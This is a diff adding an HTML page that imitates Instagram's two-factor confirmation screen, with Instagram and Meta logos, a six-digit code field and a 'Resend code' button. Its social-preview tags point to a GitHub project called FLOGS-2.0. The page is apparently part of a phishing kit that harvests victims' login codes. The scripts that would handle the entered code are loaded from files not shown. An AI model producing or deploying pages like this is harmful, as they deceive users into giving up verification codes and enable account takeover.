@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Two-Factor Authentication</title>
+  
+  <!-- Open Graph Meta Tags for Social Media Preview -->
+  <meta property="og:title" content="FLOGS - Verification">
+  <meta property="og:description" content="Complete your FLOGS verification">
+  <meta property="og:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  <meta property="og:url" content="https://github.com/Igbined/FLOGS-2.0">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen font-sans">
+
+  <div class="w-full max-w-sm px-6">
+
+    <!-- Instagram Logo at the Top -->
+    <div class="flex justify-center mb-8">
+      <img src="../IMAGES/IMG_0085.png" alt="Instagram" class="w-16 h-16" />
+    </div>
+
+    <div class="text-center mb-6">
+      <h2 class="text-xl font-semibold text-gray-900">Enter confirmation code</h2>
+      <p class="text-sm text-gray-500 mt-2">
+        We sent a 6-digit code to your email, phone and SMS
+      </p>
+    </div>
+
+    <!-- Single 6-Digit Input -->
+    <div class="mb-8">
+      <input 
+        id="codeInput"
+        type="text" 
+        maxlength="6"
+        placeholder="000000"
+        class="w-full text-center text-3xl tracking-[8px] py-4 border-2 border-gray-300 rounded-2xl focus:border-blue-500 focus:outline-none"
+        autofocus
+      >
+    </div>
+
+    <!-- Confirm Button -->
+    <button id="confirmBtn"
+      class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3.5 rounded-xl mb-4 transition active:scale-95 disabled:opacity-70 flex items-center justify-center gap-2">
+      <span id="btnText">Confirm</span>
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" stroke-opacity="0.3"/>
+        <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+    </button>
+
+    <!-- Error Message -->
+    <div id="errorMsg" class="text-red-500 text-sm text-center hidden mb-4">
+      Incorrect code. Please try again.
+    </div>
+
+    <!-- Resend Code -->
+    <div class="text-center">
+      <button id="resendBtn" class="text-blue-600 text-sm font-medium hover:underline">
+        Resend code
+      </button>
+    </div>
+
+    <!-- Meta Logo at the Bottom -->
+    <div class="mt-16 flex justify-center">
+      <img src="../IMAGES/IMG_0084.png" alt="Meta" class="h-8" />
+    </div>
+  </div>
+
+  <script src="../JS/config.js" defer></script>
+  <script src="../JS/secure.js" defer></script>
+</body>
+</html>
